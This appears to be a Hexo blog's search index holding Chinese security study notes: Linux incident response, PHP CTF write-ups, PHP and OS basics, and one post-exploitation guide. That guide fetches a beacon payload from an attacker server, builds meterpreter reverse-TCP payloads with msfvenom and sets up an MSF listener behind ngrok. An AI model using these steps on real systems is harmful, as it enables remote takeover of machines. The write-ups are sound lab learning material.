<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux应急响应</title>
      <link href="2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="常规检测流程"><a href="#常规检测流程" class="headerlink" title="常规检测流程"></a>常规检测流程</h1><h2 id="查杀病毒进程"><a href="#查杀病毒进程" class="headerlink" title="查杀病毒进程"></a>查杀病毒进程</h2><ul><li><strong>1.discover</strong> <ul><li>根据进程discover<ul><li>根据进程的cpu和内存情况找到病毒<ul><li><code>ps aux|head -1;ps aux|sort -rn -k +3|head</code> cpu占用最多的10个进程</li><li><code>ps aux|head -1;ps aux|sort -rn -k +4|head</code> 内存占用最多的10个进程</li></ul></li><li><code>top</code>动态查看进程，包含cpu，内存占用等信息</li><li><code>ps aux</code>静态查看进程</li><li><code>ps -ef</code>静态查看进程，信息量较少</li></ul></li><li>根据网络连接discover<ul><li><code>netstat -antlp | grep EST</code>查看已建立连接，检查是否存在异常外联进程。<ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png" alt="暂未发现连接外部服务器"></li></ul></li></ul></li></ul></li><li><strong>2.kill</strong><ul><li><code>netstat -anltp | grep 68670</code>查看该进程网络连接情况</li><li><code>kill 9  pid</code>//9代表快速停止</li></ul></li><li><strong>3.delete</strong><ul><li><code>ls -la /proc/$pid/exe</code></li><li><code>lsof -p $pid</code>查看病毒进程都打开了哪些文件，方便彻底清除</li></ul></li></ul><h2 id="查看威胁是否完全清除"><a href="#查看威胁是否完全清除" class="headerlink" title="查看威胁是否完全清除"></a>查看威胁是否完全清除</h2><p>​    黑客可能会通过各种手段再次远程下载病毒运行</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>定时任务（即定时启动程序的任务）可以帮助入侵者运行痕迹清理脚本或者持久控制</p><ul><li>添加一个定时任务<code>vim /etc/crontab</code></li><li>添加内容：<code>*/1 * * * * root ./root/Desktop/1</code> //<code>*</code>代表秒分时年月日，root权限，执行文件1，即每隔一分钟运行一次程序1<ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/3.png" alt="定时任务"></li></ul></li><li><code>tail /var/log/cron</code> //查看异常定时任务日志</li><li><code>crontab -l</code>查看计划任务是否有恶意脚本或者恶意命令</li></ul><h3 id="自启动项和服务"><a href="#自启动项和服务" class="headerlink" title="自启动项和服务"></a>自启动项和服务</h3><p>查看是否存在开机启动的病毒</p><ul><li><code>cat /etc/rc.local</code>查看是否有异常开机启动项</li></ul><h3 id="用户安全性排查"><a href="#用户安全性排查" class="headerlink" title="用户安全性排查"></a>用户安全性排查</h3><p>查看黑客有没有创建后门</p><ul><li><p><code>w</code>命令可以显示当前用户登录在线情况</p></li><li><p><code>cat /etc/passwd | grep bash</code>//查看当前系统可被登录的账号</p></li><li><p><code>grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code>查看登陆用户和他的ip</p></li><li><p><code>last</code>命令可以查看系统每次登录的账号、ip、登录时间、持续时间</p><ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/8.png" alt="每次登录的" style="zoom: 80%;"></li></ul></li><li><p><code>lastlog</code>命令可以查看账号的最近一次登录时间</p><ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/6.png" alt="最近一次登录" style="zoom:80%;"></li></ul></li><li><p>攻击用户排查</p><ul><li><code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort</code>爆破root的恶意ip</li><li><code>grep refused /var/log/secure* | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c |sort -nr | moregrep &quot;Failed password&quot; /var/log/secure* | grep -E -o &quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot; | uniq -c </code>查看试图爆破的ip</li></ul></li><li><p>用户登陆方式排查</p><p>对其来路进行封堵</p><ul><li><code>cat /var/log/secure* | grep Accepted</code>//查看登陆成功的记录，下图出现的是ssh2说明是通过ssh爆破登陆的<ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/7.png" alt="ssh服务" style="zoom: 150%;"></li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透1%</title>
      <link href="2021/06/16/%E5%90%8E%E6%B8%97%E9%80%8F1/"/>
      <url>2021/06/16/%E5%90%8E%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<h1 id="如何控制目标机器"><a href="#如何控制目标机器" class="headerlink" title="如何控制目标机器"></a>如何控制目标机器</h1><ul><li>远程下载木马文件，这就需要一个服务器，通过请求服务器下载木马到目标机器</li><li>msfvenom制作木马</li><li>利用MSF攻击目标，设置监听</li><li>目标机器运行木马→MSF获得对方机器的session→控制目标机器</li></ul><h2 id="搭建本地服务器"><a href="#搭建本地服务器" class="headerlink" title="搭建本地服务器"></a>搭建本地服务器</h2><h3 id="用于远程下载木马"><a href="#用于远程下载木马" class="headerlink" title="用于远程下载木马"></a>用于远程下载木马</h3><p>1.本地利用python搭建简单服务器<br><code>python -m SimpleHTTPServer 8000</code></p><p>2.使用花生壳，ngrok，sunny_ngrok等内网穿透软件把自己在内网（局域网外无法访问的）的电脑变成外网服务器，可以提供远程下载服务。</p><p>3.ngrok启动（Linux下）：<code>./ngrok http 8000</code>  </p><ul><li> 8000是本地端口</li></ul><h3 id="Windows-Linux远程下载木马命令"><a href="#Windows-Linux远程下载木马命令" class="headerlink" title="Windows/Linux远程下载木马命令"></a>Windows/Linux远程下载木马命令</h3><p><code>curl -o C:\Users\wohcoos\Desktop\beacon.bin http://ip:port/charlotte/beacon.bin</code></p><h2 id="msfvenom制作木马"><a href="#msfvenom制作木马" class="headerlink" title="msfvenom制作木马"></a>msfvenom制作木马</h2><h3 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h3><ul><li><p><code>Windows:msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip(外网) LPORT=36491 -f raw &gt; /home/kali/</code></p></li><li><p><code>Linux:msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ip（外网） LPORT=36491 -f elf &gt; /home/kali/</code></p></li></ul><h2 id="MSF攻击"><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h2><pre><code>use exploit/multi/handler  set payload windows/x64/meterpreter/reverse_tcp  set lhost 192.168.245.128  //这个就是你刚刚网站的填写的IP，内网穿透软件设置映射到本机的ipset lport 7758  //这个就是刚刚IP后面跟着的端口,内网穿透软件设置映射到本机的portexploit //运行，开始监听目标运行木马文件获得的session</code></pre><h2 id="Linux后台运行程序命令"><a href="#Linux后台运行程序命令" class="headerlink" title="Linux后台运行程序命令"></a>Linux后台运行程序命令</h2><p>目的就是方便</p><ul><li><code>screen -S name </code>新建后台程序</li><li><code>screen -ls</code> 后台程序清单</li><li><code>screen -r</code> 恢复后台程序</li><li><code>CTRL+a+d</code>  返回操作界面</li></ul><h3 id="cna检测杀软脚本使用"><a href="#cna检测杀软脚本使用" class="headerlink" title="cna检测杀软脚本使用"></a>cna检测杀软脚本使用</h3><p>防查杀</p><p>命令:<code>AV_Query</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PHP2</title>
      <link href="2021/06/10/CTF-PHP2/"/>
      <url>2021/06/10/CTF-PHP2/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><pre><code class="php">flag In the variable ! &lt;?php  error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123;    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;        die(&quot;args error!&quot;);    &#125;    eval(&quot;var_dump($$args);&quot;);&#125;?&gt;</code></pre></li></ul><ul><li><p><code>error_reporting(0)</code>关闭错误报告</p></li><li><p><code>include</code>文件包含，此时包含文件flag1.php</p></li><li><p><code>highlight_file(__file__);</code>高亮代码，没啥用</p></li><li><p><code>isset</code>判断<code>args</code>参数是否存在，存在则将用户的输入赋值给它</p></li><li><p><code>preg_match</code>匹配正则表达式，/^（开始）, \w表示任意一个单词字符，即[a-z,A-Z,0-9_] ,+将前面的字符匹配一次或多次，$/（结尾）。此时如果用户输入超出这里的范围，如输入符号是不被允许的</p></li><li><p><code>die()</code> 函数输出一条消息，并退出当前脚本。此时如果用户输入不满足第二个if的正则表达式，则输出<code>args error!</code></p></li><li><p><strong><code>flag In the variable !</code>提示flag在变量中</strong></p></li><li><p>两个$$即把<code>args</code>设置为可变变量。</p><ul><li><img src="/2021/06/10/CTF-PHP2/4.jpg" alt="可变变量介绍" style="zoom:50%;"></li></ul></li><li><p><code>eval</code>把括号里的内容当作代码执行</p></li></ul><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li>利用文件包含打印出flag</li><li>利用题目的提示<code>flag In the variable</code>获取flag</li></ol><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><ol><li><p>采用思路一，行不通。正则判断条件不允许出现<code>.()</code>等特殊符号，因为不满足正则条件，所以输入<code>flag.php</code>会直接返回<code>args error!</code>,所以无法通过执行system（cat flag1.php）等系统命令查看flag1.php</p><ul><li><img src="/2021/06/10/CTF-PHP2/2.jpg" alt="返回error" style="zoom: 67%;"></li><li><p>如果输入满足正则条件，是下面的结果，但无法和思路一结合起来</p></li><li><img src="/2021/06/10/CTF-PHP2/3.jpg" alt="返回null" style="zoom:67%;"></li></ul></li><li><p>结合题目提示，利用可变变量，把所有的变量都打印出来即可获得flag</p><ul><li>题目里面除了<code>args</code>以及没有第二个变量，所以我们要使用默认存在的全局变量``$GLOBALS<code>获得所有变量即获得flag，PHP 在名为 </code>$GLOBALS[index] `的数组中存储了所有全局变量。</li></ul></li><li><p><code>args=GLOBALS</code>正好符合条件利用可变变量输出，最后得到flag。</p></li><li><p>执行流程</p><ol><li>用户输入<code>args=GLOBALS</code>,根据第七行把<code>GLOBALS</code> 赋给<code>$args</code>，满足第八行的判断，跳到<code>evel</code>执行<code>var_dump($GLOBALS);  </code></li></ol><p><img src="/2021/06/10/CTF-PHP2/1.jpg" alt="writeup"></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PHP</title>
      <link href="2021/06/10/CTF-PHP/"/>
      <url>2021/06/10/CTF-PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong><br>在php中有两种比较符号: <code>==</code>和<code>===</code></p><ul><li>== ：弱等于。在比较前会先把两种<strong>字符串类型转成相同</strong>的再进行比较。它不会比较<strong>变量类型</strong>，只比较值。</li><li>=== ：强等于。在比较前会<strong>先判断两种字符串类型是否相同</strong>再进行比较，如果类型不同直接返回不相等。<strong>既比较值也比较类型</strong>。</li></ul><h2 id="PHP转换规则"><a href="#PHP转换规则" class="headerlink" title="PHP转换规则"></a>PHP转换规则</h2><ul><li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较</li><li>若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0</li><li>eg:”admin”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）</li><li>布尔值true和任意字符串都弱相等</li></ul><ul><li><pre><code class="php">var_dump(12==&quot;12&quot;)                                   //truevar_dump(12==&quot;12aa&quot;)                               //truevar_dump( &quot;admin&quot;==0)                               //truevar_dump(false==&quot;&quot;==0==NULL)                        //truevar_dump(true==&quot;hyuf&quot;)                              //true</code></pre></li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><pre><code class="php">$num=$_GET[&#39;num&#39;];if(!is_numeric($num))&#123;echo $num;if($num==1)echo &#39;flag&#123;******&#125;&#39;;&#125; </code></pre></li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>使用$定义一个变量<code>$num</code><br><code>is_numeric()</code> 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE<br>flag在第二个条件中<br>在第一个if语句，如果输入为数字，则打印输入的数字，不打印flag<br>所以我们要执行第二个if语句，所以不能单纯输入数字，否则会执行第一个if语句<br>为满足判断条件2，根据上述转换规则，输入的数字为1+非数字字符则满足判断条件2打印出flag</p><p><img src="/2021/06/10/CTF-PHP/1.png" alt="writeup"></p><h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><ul><li>web 应用采用 include()、include_once()、require()、require_once()等文件包含函数，并且需要包含的文件路径是通过<strong>用户传输参数</strong>的方式引入；</li><li>用户能够<strong>控制</strong>包含文件的<strong>参数</strong>，被包含的文件可被当前页面访问；</li></ul><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><ul><li><pre><code class="php">&lt;?php       include &quot;flag.php&quot;;       $a = @$_REQUEST[&#39;hello&#39;];       eval( &quot;var_dump($a);&quot;);       show_source(__FILE__);?&gt; </code></pre></li></ul><ul><li><p><code>Include（）</code>：包含并运行指定的文件，只有在程序执行到include时才包含文件，且当包含文件发生错误时，程序警告，但会继续执行。此时包含文件为flag.php</p></li><li><p><code>$_REQUEST[&quot;参数&quot;]</code>，此时参数为hello，此时用于提供给用户输入</p></li><li><p><code>eval() </code>函数可将字符串转换为代码执行，并返回一个或多个值，此时用于执行我们想要的命令</p></li><li><p><code>var_dump()</code>的功能是输出变量的信息，此时用于将运行结果输出给我们看</p></li><li><p><code>show_source()</code>函数，可以使用<code>show_source(&#39;flag.php&#39;)</code>直接查看<code>flag.php</code>页面</p><h3 id="如何查看flag-php文件"><a href="#如何查看flag-php文件" class="headerlink" title="如何查看flag.php文件"></a>如何查看flag.php文件</h3><p>通过Linux的系统命令<code>cat flag.php</code>查看文件<br>通过php函数<code>show_source()</code>函数直接查看</p><h3 id="大体流程"><a href="#大体流程" class="headerlink" title="大体流程"></a>大体流程</h3><ul><li>使用php函数→用户输入→php函数转换→执行操作系统命令→获取flag</li><li>php函数直接查看flag</li></ul><p>本题定义了一个变量<code>$a</code>，以及赋一个用户可控的参数<code>hello</code>给$a,我们利用可控参数hello找到我们的flag,传值过程(hello→a→eval）<code>eval</code>函数将用户的输入转化为代码执行（执行系统命令）从而通过执行系统命令查看我们的flag.php文件</p><p>因为已知页面有<code>show_source()</code>函数，可以使用<code>show_source(&#39;flag.php&#39;)</code>直接查看<code>flag.php</code>页面</p><p><img src="/2021/06/10/CTF-PHP/2.png" alt="writeup"></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础</title>
      <link href="2021/06/08/PHP%E5%9F%BA%E7%A1%80/"/>
      <url>2021/06/08/PHP%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP语言特点"><a href="#PHP语言特点" class="headerlink" title="PHP语言特点"></a>PHP语言特点</h2><p>1.php是后端语言，负责在服务器处理数据，并把数据返回给浏览器<br>2.php文件可以同时用前端语言和php来写，但是php代码片段（<?php ?>）部分不能加入其他语言<br>3.文件以.php结尾</p><h2 id="PHP语言规则"><a href="#PHP语言规则" class="headerlink" title="PHP语言规则"></a>PHP语言规则</h2><ol><li><p>php脚本以<code>&lt;?php开头，以?&gt;</code>结尾,php语句以分号结尾<br>eg:</p><pre><code class="php">&lt;?php        echo “hello world”;?&gt; </code></pre></li><li><p>php采用 <code>$变量名</code> 来定义一个变量<br>eg:名字一样，输出不一样</p><pre><code class="php">&lt;?php            $color = ‘red’;            $Color = ‘bule’;?&gt;</code></pre></li><li><p>单行注释:#和//<br>多行注释:/* */</p></li><li><p>变量规则:<br>1.php采用 <code>$变量名</code> 来定义一个变量<br>2.必须以<strong>字母/下划线开头</strong> 不能以数字开头<br>3.变量名只能包含<strong>字母（A-z）、数字（0-9）、下划线（_）</strong><br>4.弱类型变量，不必声明变量数据类型，可以赋任何数据类型的值，php会自动转换<br>5.无创建变量命令，首次赋值自动创建</p></li><li><p>输出方法</p><ul><li><code>echo ‘hello’;</code></li><li><code>echo (‘hello’);</code></li></ul></li></ol><h2 id="PHP五种基本数据类型"><a href="#PHP五种基本数据类型" class="headerlink" title="PHP五种基本数据类型"></a>PHP五种基本数据类型</h2><ol><li><p>字符串<code>string</code></p><ul><li><p>字符串要单引号或者双引号括起来</p></li><li><p>使用单引号，不解析字符串，即字符串包含变量名，只输出<strong>变量名</strong>不输出<strong>变量值</strong>，单引号输出纯文本，大白话就是里面是什么就输出什么</p></li><li><p>使用双引号，解析字符串，会解析变量从而输出变量值</p><p><img src="/2021/06/08/PHP%E5%9F%BA%E7%A1%80/1.jpg" alt="解析字符串的区别"></p></li><li><p>运算符</p><p>字符串运算符<code>.</code>:用于拼接字符串</p><p><img src="/2021/06/08/PHP%E5%9F%BA%E7%A1%80/2.png.jpg" alt="拼接字符串"></p><p>比较运算符</p><img src="/2021/06/08/PHP%E5%9F%BA%E7%A1%80/3.png.jpg" alt="运算符基础" style="zoom:33%;"></li></ul></li><li><p>布尔值</p><ul><li>0为假，非0为真</li><li>与：<code>and/&amp;&amp;  </code> 或：<code>or/|| </code></li></ul></li><li><p>条件判断 </p><p>if（判断条件）{控制块}<br>if($count&gt;60)<br>{<br>echo ‘及格’<br>} </p></li></ol><h2 id="PHP日志"><a href="#PHP日志" class="headerlink" title="PHP日志"></a>PHP日志</h2><p>1.位于 /var/log/httpd 路径下，error_log是报错日志，当php运行报错的时候，可使用<code>tail -n 5 error_log</code> 查看最后5行报错信息，也就是最新的报错信息</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统基础</title>
      <link href="2021/06/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"/>
      <url>2021/06/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h1><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><p>1.pwd #(now place)<br>2.cd .. #返回上一级<br>3.cd + path #to path<br>4.cd - #previous path<br>5.ls+path #查看某文件夹下的内容<br>6.ls -l #more info<br>7.ls -lR #everydircontent and info<br>8.mkdir #make file<br>9.touch #建立文档<br>10.rm #del<br>11.echo helloworld &gt; new.txt #write content into txt (cover)<br>12.echo abc &gt;&gt; new.txt #(add to)<br>13.cp 2.txt /path/3.txt #(复制文档)<br>14.cp -r /file /newpath/ (复制文件)<br>15.mv 2.txt /path/2.txt（move）<br>16.cat #全部打印<br>17.more #翻页查看<br>18.head -n 3 abc.txt#看前三行<br>19.ctrl U #清理光标前内容<br>20.ctrl K #清理光标后内容<br>21.tar cvf 2.tar 1.txt #压缩<br>22.tar xvf 2.tar#解压缩<br>23.which java #find where is java</p><h2 id="VIM命令"><a href="#VIM命令" class="headerlink" title="VIM命令"></a>VIM命令</h2><p>1./hello #search<br>2.esc+: 2 #to second<br>3.dd #删除光标所在行<br>4.ndd #删除光标下n行<br>5.yy #copy一行<br>6.set nu #显示行号<br>7.p $paste</p><h2 id="Linux用户权限划分命令"><a href="#Linux用户权限划分命令" class="headerlink" title="Linux用户权限划分命令"></a>Linux用户权限划分命令</h2><p>用户组：特征相同的用户集合<br>一个用户可同时在多组</p><p>1.useradd #add user<br>2.usermod -g usergroup username #fix usergroup<br>3.usermode -l newname username #fix name<br>4.userdel username#del user<br>5.passwd username #set pwd to user,if null,is set root</p><h2 id="文件权限命令"><a href="#文件权限命令" class="headerlink" title="文件权限命令"></a>文件权限命令</h2><p>文件权限先判断是否所有者，否，再判断在不在有权限的组，全为否则属于其他用户<br>无权限-0，777最高权限，644普通文件权限，755执行权限<br>u(user),g(group),o(other),a(all)<br>rwx=421<br>-表示文档,d表示文件</p><p>1.chomd +x #添加执行权限 chmod -x#去除执行权限<br>2.chmod u(now user)/o(other user) + x #给当前/其他用户执行权限</p><h2 id="目录权限命令"><a href="#目录权限命令" class="headerlink" title="目录权限命令"></a>目录权限命令</h2><p>拥有x（执行权限）则代表可以cd进入</p><p>1.chown user:usergroup 1.txt #修改文件所有者,组<br>2.chown -R user:usergroup filename #递归修改目录里面的文档权限，改了文件的权限，并不会修改文件里文档的权限</p><h1 id="Linux-文件系统"><a href="#Linux-文件系统" class="headerlink" title="Linux 文件系统"></a>Linux 文件系统</h1><h2 id="Linux文件系统结构"><a href="#Linux文件系统结构" class="headerlink" title="Linux文件系统结构"></a>Linux文件系统结构</h2><p>虚拟文件系统VFS(Virtual File System):能够衔接各种各样的文件系统，因为它抽象了一个通用的文件系统模型，定义了通用文件系统都支持的、概念上的接口。</p><p><img src="https://pic3.zhimg.com/80/v2-212ca855ac2dad87983b23b6539e21ce_1440w.jpg" alt="Linux文件系统结构"></p><p>​                                                                                                       </p><img src="https://pic3.zhimg.com/v2-b92499b17ed11bc279689ecdb6efb4b6_b.jpg" alt="Linux文件系统结构" style="zoom: 67%;"><p>​                                                                                                          </p><p>​                                              <img src="https://pic2.zhimg.com/v2-9d77e25913894df26b0374ceae25c605_b.jpg" alt="索引节点、目录项以及文件数据关系图"></p><p>​                                                                                               <em>索引节点、目录项以及文件数据关系图</em></p><p><strong>索引节点（ <em>inode</em>）</strong>用来记录文件的元信息，比如 inode 编号、文件大小、访问权限、创建时间、修改时间、<strong>数据在磁盘的位置</strong>等等。索引节点是文件的<strong>唯一</strong>标识，它们之间一一对应，也同样都会被存储在硬盘中，所以<strong>索引节点同样占用磁盘空间</strong>。</p><p><strong>目录项（<em>dentry</em>）</strong>，用来记录文件的名字、<strong>索引节点指针</strong>以及与其他目录项的层级关联关系。多个目录项关联起来，就会形成目录结构，但它与索引节点不同的是，<strong>目录项是由内核维护的一个数据结构，不存放于磁盘，而是缓存在内存</strong>，目录则存在于磁盘。</p><p><img src="https://pic2.zhimg.com/v2-d9e36f97b24b2a7f760a81d0b095c36d_b.jpg" alt="块分布图"></p><p>引导块：在系统启动时用于启用引导<br><strong>超级块</strong>:包含的是文件系统的重要信息，比如 inode信息，块信息<br><strong>块组描述符</strong>:包含文件系统中<strong>各个块组</strong>的状态，比如块组中空闲块和 inode 的数目等<br>数据位图和 inode 位图：用于表示对应的数据块或 inode 状态<br>inode 列表:包含了块组中所有的 inode，inode 用于保存文件系统中与各个文件和目录相关的所有元数据<br>数据块:包含文件的有用数据</p><p>ext2（索引式文件系统）<br>ext3（日志式文件系统）<br>ext4（日志式文件系统）</p><h2 id="Linux文件类型"><a href="#Linux文件类型" class="headerlink" title="Linux文件类型"></a>Linux文件类型</h2><ol><li><p>普通文件（-）</p><ol><li>从Linux的角度来说，类似mp4、pdf、html这样应用层面上的文件类型都属于普通文件</li></ol></li><li><p>目录文件（d，directory file）</p></li><li><p>符号链接（l，symbolic link）</p><ol><li>这种类型的文件类似Windows中的快捷方式，是指向另一个文件的间接指针，也就是我们常说的软链接</li></ol></li><li><p>块设备文件（b，block）和字符设备文件（c，char）</p><ol><li><p>这些文件一般隐藏在/dev目录下，在进行设备读取和外设交互时会被使用到</p></li><li><p>比如磁盘光驱就是块设备文件，串口设备则属于字符设备文件</p></li><li><p>系统中的所有设备要么是块设备文件，要么是字符设备文件</p></li><li><p>FIFO（p，pipe）</p></li><li><p>管道文件主要用于进程间通讯。比如使用mkfifo命令可以创建一个FIFO文件，启用一个进程A从FIFO文件里读数据，启动进程B往FIFO里写数据，先进先出，随写随读。</p><p>6.套接字（s，socket）</p></li><li><p>用于进程间的网络通信，也可以用于本机之间的非网络通信</p></li></ol></li></ol><h2 id="Linux文件目录"><a href="#Linux文件目录" class="headerlink" title="Linux文件目录"></a>Linux文件目录</h2><img src="https://pic3.zhimg.com/80/v2-b90ccc05d3a17b7bf30e4528faf96f4a_1440w.jpg" alt="Linux文件目录" style="zoom:33%;"><h1 id="Linux的引导和启动"><a href="#Linux的引导和启动" class="headerlink" title="Linux的引导和启动"></a>Linux的引导和启动</h1><p>事实上，操作系统的启动分为两个阶段：引导和启动。<br>引导阶段开始于打开电源开关或者重启，结束于内核初始化完成和 systemd 进程成功运行。<br>启动阶段接管了剩余工作，直到操作系统进入可操作状态。</p><ul><li>BIOS 上电自检（POST）</li><li>引导装载程序 (GRUB2)</li><li>内核初始化</li><li>启动 systemd，其是所有进程之父</li></ul><h2 id="引导过程"><a href="#引导过程" class="headerlink" title="引导过程"></a>引导过程</h2><h3 id="BIOS-上电自检（POST）"><a href="#BIOS-上电自检（POST）" class="headerlink" title="BIOS 上电自检（POST）"></a>BIOS 上电自检（POST）</h3><p>上电自检主要由硬件的部分来完成。<br>BIOS 上电自检确认硬件的功能正常后查找引导扇区，随后有效引导记录的第一个引导扇区被装载到内存中，并且控制权也转移到此段代码。</p><h3 id="引导装载程序-GRUB2"><a href="#引导装载程序-GRUB2" class="headerlink" title="引导装载程序 (GRUB2)"></a>引导装载程序 (GRUB2)</h3><p>GRUB2 是一个用于计算机寻找内核并加载其到内存的程序。</p><p>1.BIOS 将查找MBR（主引导记录）<br>2.加载 Linux 内核到内存，转移控制权到内核<br>3.内核(压缩格式)自解压完成，则加载 <a href="https://en.wikipedia.org/wiki/Systemd">systemd</a> 进程并转移控制权到<br>4.这就是引导过程的结束。此刻，Linux 内核和 systemd 处于运行状态</p><h2 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h2><h3 id="启动systemd"><a href="#启动systemd" class="headerlink" title="启动systemd"></a>启动systemd</h3><p>1.systemd 是所有进程的父进程。<br>2.用户级目标态（<code>multi-user.target</code> 或 <code>graphical.target</code>） 初始化</p><h3 id="启动完成标准"><a href="#启动完成标准" class="headerlink" title="启动完成标准"></a>启动完成标准</h3><p>以 <code>*</code> 开头的目标态是通用的启动状态,说明系统已经启动完成。eg: *graphical.target or *multi-user.target</p><h1 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h1><h2 id="Windows引导和启动"><a href="#Windows引导和启动" class="headerlink" title="Windows引导和启动"></a>Windows引导和启动</h2><p>目前主要的系统引导方式也有两种：<br>1.传统BIOS + MBR<br>2.新型UEFI + GPT<br>UEFI BIOS可同时识别MBR分区和GPT分区，所以MBR和GPT磁盘都可用于启动操作系统，但是UEFI下只能将系统安装在GPT磁盘中。<br>UEFI是一个微型操作系统，能够识别FAT文件系统，运行efi程序。</p><h3 id="传统BIOS-MBR"><a href="#传统BIOS-MBR" class="headerlink" title="传统BIOS + MBR"></a>传统BIOS + MBR</h3><p><img src="https://pic2.zhimg.com/80/v2-151011877000bb57b29c0c86576a5691_1440w.jpg" alt="传统BIOS + MBR"></p><p>1.上电，执行Legacy BIOS.<br>2.进行POST自检，完成硬件初始化。<br>3.查找MBR中的IPL（用于确定活动主分区），找到该分区的引导扇区（第一个扇区）中的引导记录（PBR），载入PBR中的启动管理器（bootmgr.exe或NTLDR）。<br>4.bootmgr.exe读取该分区根目录下boot文件夹里的启动设置文件（BCD或boot.ini），然后载入程序winload.exe（位置：C:\Windows\system32\winload.exe）来加载OS内核。<br>5.内核程序执行系统初始化。</p><h3 id="新型UEFI-GPT"><a href="#新型UEFI-GPT" class="headerlink" title="新型UEFI + GPT"></a>新型UEFI + GPT</h3><p><img src="https://pic2.zhimg.com/80/v2-c6d908835871f938fe71c783b4cc8e01_1440w.jpg" alt="新型UEFI + GPT"></p><p>1.开机，执行UEFI BIOS。<br>2.UEFI BIOS运行预加载环境先直接初始化CPU和内存，CPU和内存若有问题则直接黑屏，其后启动PXE采用枚举方式搜索各种硬件并加载驱动，完成硬件初始化。<br>3.从EFI分区(不一定第一个扇区)找到、读入、执行启动管理器（\efi\Microsoft\boot\bootmgfw.efi）。<br>4.bootmgfw.efi导入EFI分区BCD文件（efi\Microsoft\BCD），然后根据其配置内容载入程序winload.efi（位置：C:\Windows\system32\winload.efi）来加载OS内核。<br>Tips：BCD是一个数据库文件，如果包含多个系统，信息会包含在BCD中，通过显示一个系统列表供用户选择。</p><h2 id="Windows用户管理"><a href="#Windows用户管理" class="headerlink" title="Windows用户管理"></a>Windows用户管理</h2><p>每个账户有自己唯一的SID（安全标识符）<br>账户组作用：简化权限赋予</p><h3 id="常见内置组"><a href="#常见内置组" class="headerlink" title="常见内置组"></a>常见内置组</h3><p>1）Administrators：管理员组<br>2）Backup Operators：具有备份和还原的权限组<br>3）Guests：来宾组<br>4）Network ：网络配置组<br>5）Remote：远程桌面组<br>6）Users：新用户的默认组<br>7）Print ：打印机组</p><h3 id="特殊本地内置组"><a href="#特殊本地内置组" class="headerlink" title="特殊本地内置组"></a>特殊本地内置组</h3><p>9）Everyone：任何一个用户都属于这个组<br>10）Authenticated 